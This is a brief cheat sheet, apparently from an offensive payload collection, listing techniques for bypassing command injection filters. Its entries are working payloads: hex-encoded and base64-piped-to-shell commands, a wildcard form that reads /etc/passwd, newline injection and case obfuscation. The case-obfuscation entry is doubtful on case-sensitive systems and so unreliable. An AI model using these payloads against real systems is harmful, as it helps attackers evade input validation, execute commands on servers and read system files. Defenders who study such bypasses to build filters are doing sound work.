# Filter Bypass

## Summary
Bypass command injection filters.

## Techniques
- Hex encoding: `$(printf '\x77\x68\x6f\x61\x6d\x69')`
- Base64: `echo d2hvYW1p | base64 -d | sh`
- Wildcards: `/???/c?t /???/p??s??`
- Newlines: `%0a`
- Case obfuscation: `WhOaMi`
